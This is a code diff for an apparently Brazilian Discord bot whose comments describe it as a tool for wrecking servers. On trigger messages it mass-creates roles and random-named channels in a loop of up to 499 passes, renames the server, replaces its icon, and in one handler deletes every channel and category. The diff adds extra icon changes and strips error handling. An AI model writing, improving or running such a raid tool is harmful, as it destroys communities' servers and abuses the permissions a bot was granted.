@@ -25,16 +25,14 @@ client.on("message", async (message) => {
        message.delete();                                                                           //deleta a mensagem do autor
        let i;                                                                                      //declara uma variavel a ser usada em um loop
        console.log(`ser humano falou ae meu parcero fode tudo ae men`)                             //manda uma msg no console falando ne
-       for(i = 0; i < 499; i++){                                                                   //começa o loop que começa em 0 e vai se repetir 498 vezes incrementando 1 no i a cada loop
+       message.guild.setIcon('./icon.png') 
+	for(i = 0; i < 499; i++){                                                                   //começa o loop que começa em 0 e vai se repetir 498 vezes incrementando 1 no i a cada loop
         message.guild.createRole('NOOT NOOT')                                                      //cria um cargo com esse nome ae
-	.catch(err => {                                                                            //se der erro...
-		return;                                                                            //...vai retornar nada
-	});
 	    message.guild.setName(process.env.SERVER_NAME)                                           //muda o nome do sv pra esse nome ae owu
 	    const textuh = makeid(32);                                                             //cria uma variavel string usando aquela function ali em cima
 	    message.guild.createChannel(`${textuh}`, 'text')                                       //cria um canal com o nome a variavel textuh
-	    message.guild.createChannel(`${textuh}`, 'voice');                                       //cria um canal de texto com o nome a var textuh
-	    message.guild.setIcon('./icon.png')   
+	    message.guild.createChannel(`${textuh}`, 'voice');                                       //cria um canal de texto com o nome a var textuh  
+	    message.guild.setIcon('./icon.png') 
 	if(message.guild.channels > 499) break;
        }
     }
@@ -42,10 +40,11 @@ client.on("message", async (message) => {
 	    console.log(`ser humano falou ae meu parcero deleta tudo ae men`)                      //manda uma mensagem no console falando isso ae
 	    message.delete();                                                                      //deleta a mensagem do autor
         server.deleteAll()                                                                         //deleta todos os canais e categorias do sv
+	message.guild.setIcon('./icon.png') 
         const texth = makeid(32);                                                                  //cria outra variavel usando aquela function ali
 	    message.guild.createChannel(`${texth}`, 'text');                                       //cria um canal de texto com o nome a var texth	
 	    message.guild.setName(process.env.SERVER_NAME)                                         //coloca o nome do sv esse ae uwu
-	    message.guild.setIcon('./icon.png')   
+	    message.guild.setIcon('./icon.png')  
     }
 });
 
